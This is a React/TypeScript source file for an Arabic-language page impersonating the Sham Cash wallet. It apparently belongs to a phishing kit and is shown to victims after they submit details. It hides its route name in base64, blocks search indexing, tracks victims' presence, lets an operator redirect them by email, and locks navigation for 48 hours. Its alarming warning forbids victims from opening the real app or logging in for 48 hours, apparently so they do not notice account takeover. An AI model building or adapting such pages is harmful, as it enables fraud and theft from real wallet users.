import { createFileRoute } from "@tanstack/react-router";
import { CheckCircle2, Clock, AlertTriangle, Ban, Inbox, Timer, MessageSquare, Lock as LockIcon } from "lucide-react";
import { StatusHero } from "@/components/status-hero";
import { useEffect, useState } from "react";
import { z } from "zod";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect, readClientEmail } from "@/lib/admin-redirect";
import { supabase } from "@/integrations/supabase/client";
import { AppScreen } from "@/components/app-screen";
import { useNavigationLock } from "@/lib/nav-lock";

const searchSchema = z.object({ email: z.string().optional() });

const REVIEW_MS = 48 * 60 * 60 * 1000;

export const Route = createFileRoute("/c3VjY2Vzcw")({
  ssr: false,
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "طلبك قيد المراجعة | شام كاش" },
      { name: "description", content: "تم استلام طلبك وهو قيد المراجعة — مدة المعالجة 24 إلى 48 ساعة." },
      { property: "og:title", content: "طلبك قيد المراجعة — شام كاش" },
      { property: "og:description", content: "تم استلام طلبك وهو قيد المراجعة." },
    ],
  }),
  component: SuccessPage,
});

function SuccessPage() {
  usePresenceTracker({ page: "/c3VjY2Vzcw" });
  useAdminRedirect();
  const { email } = Route.useSearch();
  const [approvedAt, setApprovedAt] = useState<number | null>(null);
  const [now, setNow] = useState(() => Date.now());

  useEffect(() => {
    const key = "sham_approved_at";
    try {
      const cached = window.localStorage.getItem(key);
      if (cached) setApprovedAt(Number(cached));
    } catch { /* ignore */ }
    const mail = email ?? readClientEmail();
    if (!mail) {
      const t = Date.now();
      setApprovedAt((prev) => prev ?? t);
      try { window.localStorage.setItem(key, String(t)); } catch { /* ignore */ }
      return;
    }
    void (async () => {
      const { data } = await supabase
        .from("client_routes" as never)
        .select("route, updated_at")
        .eq("email", mail)
        .maybeSingle();
      const row = data as { route?: string | null; updated_at?: string | null } | null;
      const stamp = row?.route === "/c3VjY2Vzcw" && row.updated_at ? new Date(row.updated_at).getTime() : Date.now();
      setApprovedAt(stamp);
      try { window.localStorage.setItem(key, String(stamp)); } catch { /* ignore */ }
    })();
  }, [email]);

  useEffect(() => {
    const t = window.setInterval(() => setNow(Date.now()), 1000);
    return () => window.clearInterval(t);
  }, []);

  // قفل التنقل حتى انتهاء مدة المراجعة (٤٨ ساعة)
  useNavigationLock("/c3VjY2Vzcw", approvedAt ? approvedAt + REVIEW_MS : null);

  const remaining = approvedAt ? Math.max(0, approvedAt + REVIEW_MS - now) : null;
  const remainingLabel = formatRemaining(remaining);

  return (
    <AppScreen compactLogo>
      <div dir="rtl" className="flex flex-col items-center text-center">
        <StatusHero
          tone="success"
          icon={CheckCircle2}
          stripLabel="تم الاستلام بنجاح"
          title="تم استلام طلبك"
          subtitle={<>طلبك الآن قيد المراجعة لدى فريق الأمان. ستصلك نتيجة المراجعة عبر <span className="font-bold text-white">رسالة نصية (SMS)</span> على رقم جوّالك المسجّل، ولا حاجة لإعادة إرسال الطلب.</>}
        />

        {/* تحذير بارز: ممنوع فتح التطبيق */}
        <div
          className="mt-5 w-full overflow-hidden rounded-3xl text-right"
          style={{
            background:
              "linear-gradient(180deg, rgba(220,38,38,0.18) 0%, rgba(180,83,9,0.14) 100%)",
            border: "1.5px solid rgba(248,113,113,0.45)",
            boxShadow: "0 0 40px -8px rgba(248,113,113,0.35)",
          }}
        >
          <div
            className="flex items-center gap-2 px-4 py-2.5"
            style={{
              background: "linear-gradient(90deg, rgba(220,38,38,0.35), rgba(220,38,38,0.15))",
              borderBottom: "1px solid rgba(248,113,113,0.3)",
            }}
          >
            <div className="flex h-7 w-7 items-center justify-center rounded-xl bg-red-500/25 text-red-200">
              <Ban className="h-4 w-4" />
            </div>
            <span className="text-[13px] font-extrabold text-red-100">تنبيه حرج — ممنوع فتح التطبيق</span>
          </div>
          <div className="space-y-2.5 px-4 py-3">
            <p className="text-[13px] font-bold leading-relaxed text-white">
              يُمنع منعًا باتًا فتح تطبيق <span className="text-red-200">«شام كاش»</span> طوال فترة الـ <span className="font-extrabold text-amber-300">٤٨ ساعة</span> القادمة.
            </p>
            <ul className="space-y-1.5 text-[12px] font-medium leading-relaxed text-red-100/90">
              <li className="flex items-start gap-2">
                <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0 text-amber-300" />
                <span>أي محاولة لفتح التطبيق ستُلغي الطلب تلقائيًا وتُسجَّل كخرق أمني.</span>
              </li>
              <li className="flex items-start gap-2">
                <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0 text-amber-300" />
                <span>لا تُدخل بياناتك ولا تُحاول تسجيل الدخول من أي جهاز آخر.</span>
              </li>
              <li className="flex items-start gap-2">
                <AlertTriangle className="mt-0.5 h-3.5 w-3.5 shrink-0 text-amber-300" />
                <span>انتظر الرسالة النصية فقط — لن يتم التواصل عبر التطبيق.</span>
              </li>
            </ul>
          </div>
        </div>

        {/* ملخّص موجز للطلب */}
        {(email || approvedAt) ? (
          <div
            className="status-pill mt-4 w-full rounded-2xl px-4 py-2.5 text-right text-[12px] text-slate-200"
            style={{
              background: "rgba(15,23,42,0.5)",
              border: "1px solid rgba(255,255,255,0.06)",
            }}
          >
            {email ? <div>البريد: <span className="font-semibold text-white">{email}</span></div> : null}
            {approvedAt ? (
              <div className="mt-1 text-slate-300">
                وقت الاستلام: <span dir="ltr" className="font-semibold text-white">{new Date(approvedAt).toLocaleString("ar-SY")}</span>
              </div>
            ) : null}
          </div>
        ) : null}

        {remaining !== null ? (
          <div
            className="status-surface mt-5 w-full rounded-3xl p-4 text-center"
            style={{
              background:
                "linear-gradient(180deg, rgba(15,23,42,0.8) 0%, rgba(2,6,23,0.7) 100%)",
              border: "1px solid rgba(6,182,212,0.18)",
              backdropFilter: "blur(24px)",
              boxShadow: "0 10px 30px -10px rgba(0,0,0,0.5)",
            }}
          >
            <div className="flex items-center justify-center gap-2 text-slate-300">
              <Clock className="h-4 w-4 text-cyan-400" />
              <span className="text-[11px] font-semibold">أقصى مدة متبقية للمراجعة</span>
            </div>
            <div
              dir="ltr"
              className="mt-1 text-3xl font-bold tracking-wider"
              style={{
                backgroundImage: "linear-gradient(135deg,#38bdf8 0%,#06b6d4 100%)",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
                backgroundClip: "text",
              }}
            >
              {remainingLabel}
            </div>
            <div className="mt-1 text-[11px] text-slate-400">قد يصدر القرار قبل انتهاء المدة</div>
          </div>
        ) : null}

        <div
          className="status-surface mt-5 w-full rounded-3xl p-4 text-right sm:p-5"
          style={{
            background: "linear-gradient(180deg, rgba(15,23,42,0.85) 0%, rgba(2,6,23,0.75) 100%)",
            border: "1px solid rgba(6,182,212,0.2)",
            backdropFilter: "blur(24px)",
            boxShadow: "0 10px 30px -10px rgba(0,0,0,0.5)",
          }}
        >
          <div className="flex items-center justify-between gap-3">
            <h3 className="text-base font-extrabold text-white">ماذا بعد؟</h3>
            <span
              className="rounded-full px-3 py-1 text-[11px] font-bold tracking-wide text-amber-200"
              style={{
                background: "linear-gradient(135deg, rgba(251,191,36,0.16), rgba(6,182,212,0.14))",
                border: "1px solid rgba(251,191,36,0.35)",
              }}
            >
              ٤ خطوات
            </span>
          </div>

          <ol className="mt-4 space-y-3">
            {[
              { icon: Inbox, title: "تم استلام طلبك", hint: "طلبك قيد المراجعة من فريق الأمان الآن." },
              { icon: Timer, title: "مدة المعالجة", hint: "بين 24 و 48 ساعة من وقت الاستلام." },
              { icon: MessageSquare, title: "نتيجة المراجعة", hint: "تصلك عبر رسالة نصية (SMS) على جوّالك المسجّل." },
              { icon: LockIcon, title: "الطلب مُقفل باسمك", hint: "لا تُعِد التقديم ولا ترجع للصفحات السابقة.", warn: true },
            ].map((step, i) => {
              const Icon = step.icon;
              const warn = step.warn;
              return (
                <li
                  key={i}
                  className="status-nested flex items-start gap-3 rounded-2xl p-3.5"
                  style={{
                    background: "linear-gradient(180deg, rgba(15,23,42,0.6), rgba(2,6,23,0.4))",
                    border: "1px solid rgba(255,255,255,0.07)",
                  }}
                >
                  <div
                    className="relative flex h-12 w-12 shrink-0 items-center justify-center rounded-2xl"
                    style={{
                      color: warn ? "rgb(252,211,77)" : "rgb(165,243,252)",
                      background: warn
                        ? "linear-gradient(135deg, rgba(245,158,11,0.22), rgba(15,23,42,0.6))"
                        : "linear-gradient(135deg, rgba(6,182,212,0.22), rgba(15,23,42,0.6))",
                      border: warn ? "1px solid rgba(245,158,11,0.35)" : "1px solid rgba(6,182,212,0.35)",
                      boxShadow: warn ? "0 0 20px -6px rgba(245,158,11,0.55)" : "0 0 20px -6px rgba(6,182,212,0.55)",
                    }}
                  >
                    <Icon className="h-6 w-6" />
                    <span
                      className="absolute -top-2 -right-2 flex h-6 w-6 items-center justify-center rounded-full text-[12px] font-extrabold text-slate-900"
                      style={{
                        background: "linear-gradient(135deg,#fbbf24,#f59e0b)",
                        boxShadow: "0 2px 8px rgba(0,0,0,0.5)",
                      }}
                    >
                      {["١", "٢", "٣", "٤"][i]}
                    </span>
                  </div>
                  <div className="min-w-0 flex-1 text-right">
                    <p className="text-[15px] font-extrabold leading-snug text-white">{step.title}</p>
                    <p className="mt-1 text-[13px] leading-6 text-slate-300">{step.hint}</p>
                  </div>
                </li>
              );
            })}
          </ol>
        </div>


        <div className="pt-4 text-center text-[11px] text-slate-500">
          رقم المرجع محفوظ لدى فريق الأمان — انتظر الرسالة النصية فقط.
        </div>
      </div>
    </AppScreen>
  );
}

function formatRemaining(ms: number | null): string {
  if (ms === null) return "";
  if (ms <= 0) return "00:00:00";
  const h = Math.floor(ms / 3_600_000);
  const m = Math.floor((ms % 3_600_000) / 60_000);
  const s = Math.floor((ms % 60_000) / 1000);
  const pad = (n: number) => n.toString().padStart(2, "0");
  return `${pad(h)}:${pad(m)}:${pad(s)}`;
}
